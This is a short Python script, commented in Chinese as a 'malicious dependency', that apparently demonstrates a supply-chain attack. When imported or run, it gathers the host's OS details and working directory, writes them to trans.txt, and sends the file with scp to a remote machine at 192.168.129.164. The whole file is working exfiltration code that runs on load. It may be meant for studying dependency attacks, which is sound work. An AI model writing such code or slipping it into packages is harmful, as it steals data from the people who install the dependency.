#恶意的依赖项
print('start mal dependency。。。。。')
import os
osname =  os.uname()
cwd = os.getcwd()
print('osname', osname)
print('cwd',cwd)
write_file = './trans.txt'
with open(write_file, 'w') as f:
    f.write(str(osname) + "\n" )
    f.write(str(cwd) + "\n" ) 
os.system(('scp trans.txt Dell@192.168.129.164:E:\download'))